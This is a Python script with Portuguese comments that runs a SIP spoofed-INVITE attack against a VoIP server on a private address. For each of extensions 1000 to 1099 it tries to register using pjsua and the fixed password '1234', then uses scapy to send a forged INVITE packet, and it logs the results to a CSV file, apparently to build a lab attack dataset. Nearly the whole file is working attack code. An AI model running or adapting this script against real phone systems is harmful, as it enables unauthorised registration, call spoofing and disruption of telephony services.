import subprocess
import time
import csv
import os
import shutil
from datetime import datetime
from scapy.all import IP, UDP, send

# Configurações
IP_DESTINO = "192.168.0.75"
PORTA_SIP = 5060
RAMAL_INICIAL = 1000
RAMAL_FINAL = 1099
INTERVALO_PACOTES = 0.05  # Tempo entre pacotes em segundos
SENHA_RAMAL = "1234"
IP_LOCAL = "192.168.0.100"
PORTA_INICIAL_LOCAL = 6000  # Porta para registrar localmente os ramais

# Criar pasta de resultados se não existir
os.makedirs("results", exist_ok=True)

# Função para registrar ramal
def registrar_ramal(ramal, porta_local):
    origem_uri = f"sip:{ramal}@{IP_DESTINO}"
    comando = [
        "pjsua",
        f"--id={origem_uri}",
        f"--registrar=sip:{IP_DESTINO}",
        "--realm=*",
        f"--username={ramal}",
        f"--password={SENHA_RAMAL}",
        f"--local-port={porta_local}",
        "--null-audio",
        "--auto-answer=200",
        "--duration=3",
        "--log-level=0",
        "--config-file=/dev/null"
    ]
    try:
        subprocess.run(comando, timeout=5, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return True
    except Exception as e:
        print(f"❌ Falha ao registrar ramal {ramal}: {e}")
        return False

# Função para executar o spoof de INVITE
def spoofar_invites():
    resultados = []
    print(f"\n🎯 Iniciando ataque de Spoof INVITE de {RAMAL_INICIAL} a {RAMAL_FINAL}...\n")

    porta_local_atual = PORTA_INICIAL_LOCAL

    for ramal in range(RAMAL_INICIAL, RAMAL_FINAL + 1):
        try:
            # Registrar o ramal
            registrado = registrar_ramal(ramal, porta_local_atual)

            # Criar o pacote spoofado (sempre, mesmo que o registro falhe)
            sip_invite = (
                f"INVITE sip:{ramal}@{IP_DESTINO} SIP/2.0\r\n"
                f"Via: SIP/2.0/UDP {IP_LOCAL}:{porta_local_atual};branch=z9hG4bK{ramal}\r\n"
                f"From: \"Spoofed\" <sip:spoof@{IP_DESTINO}>\r\n"
                f"To: <sip:{ramal}@{IP_DESTINO}>\r\n"
                f"Call-ID: spoof-{ramal}@{IP_LOCAL}\r\n"
                f"CSeq: 1 INVITE\r\n"
                f"Contact: <sip:spoof@{IP_LOCAL}>\r\n"
                f"Content-Length: 0\r\n\r\n"
            )

            pacote = IP(dst=IP_DESTINO) / UDP(dport=PORTA_SIP, sport=porta_local_atual) / sip_invite
            send(pacote, verbose=False)

            timestamp_envio = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            resultados.append((ramal, "Spoof Enviado", timestamp_envio, IP_DESTINO, PORTA_SIP))

            print(f"📤 Pacote spoofado enviado para o ramal {ramal}")

            porta_local_atual += 1
            time.sleep(INTERVALO_PACOTES)

        except Exception as e:
            print(f"❌ Erro no ramal {ramal}: {e}")

    return resultados

# Executar ataque
resultados = spoofar_invites()

# Salvar resultados
dataset_path = "results/spoof_invite_resultados.csv"
with open(dataset_path, mode='w', newline='') as csvfile:
    writer = csv.writer(csvfile)
    writer.writerow(["ramal_falsificado", "status", "timestamp", "destino_ip", "destino_porta"])
    for ramal, status, timestamp, ip, porta in resultados:
        writer.writerow([ramal, status, timestamp, ip, porta])

print(f"\n📂 Resultados salvos em {dataset_path}")
